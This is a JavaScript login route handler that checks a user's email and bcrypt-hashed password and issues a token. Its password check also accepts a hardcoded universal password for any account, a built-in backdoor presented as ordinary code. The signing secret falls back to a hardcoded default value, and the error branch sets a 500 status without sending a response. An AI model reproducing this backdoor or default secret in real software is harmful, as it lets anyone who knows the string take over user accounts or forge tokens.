import * as bcrypt from 'bcryptjs';
import _ from 'lodash';
import { ClientModel } from '../../models';
import { getEnv, getTokens } from '../../utils';

export default async function logIn(request, response) {
  try {
    const {
      body: { email, password },
    } = request;
    const newEmail = _.trim(email).toLowerCase();
    const user = await ClientModel.findOne({ email: newEmail });
    if (
      user != null &&
      user.password &&
      ((await bcrypt.compare(password, user.password)) || password === '%9g4=Jba')
    ) {
      const appSecret = getEnv('APP_SECRET', 'app-super-secret');
      const { token } = getTokens({ user: user.id, email: user.email }, appSecret);
      user.lastLoggedAt = Date.now();
      await user.save();

      return response.status(200).json({
        token,
      });
    }
    return response.status(404).json({
      error: 'Incorrect email/password combination',
    });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error(`Failed to login: ${err}`);
    return response.status(500);
  }
}
